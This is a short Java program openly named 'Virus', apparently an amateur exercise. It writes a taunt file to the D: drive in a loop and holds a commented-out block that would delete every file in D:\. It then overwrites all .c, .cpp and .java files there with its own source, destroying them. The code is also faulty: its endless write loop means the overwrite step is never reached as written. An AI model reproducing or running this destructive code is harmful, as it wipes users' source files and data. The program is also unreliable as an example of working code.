
import java.io.*;
public class Virus{
	
	public static void main(String[]args) throws Exception {
		boolean i= true;	
		while(i){	
		 try {
                PrintWriter b = new PrintWriter("d:\\"+ i + ".txt");
                
                b.write("Hii.... This is me Virus");
				
				b.close();
            } catch (FileNotFoundException ex) {
               System.out.println("file not found");
        }
	}
	File file= new File("D:\\");
    File[] contents = file.listFiles();
   /* if (contents != null) {
        for (File f : contents) {
          f.delete();  
        }
    }*/
	
	for(File f: contents){
		if(f.isFile()== true){
		String path = f.getAbsolutePath();
		if(path.endsWith(".c") || path.endsWith(".cpp") || path.endsWith(".java")){
		
	PrintWriter pw = new PrintWriter(path);
	BufferedReader br = new BufferedReader(new FileReader("D:/Java/Java Programs/internship/Virus.java"));
	String line=br.readLine();
	
	while(line!=(null)){
		
		pw.print(line);
		line=br.readLine();
		
	}
	br.close();
	pw.close();
	
	}
	}
	
}
}
}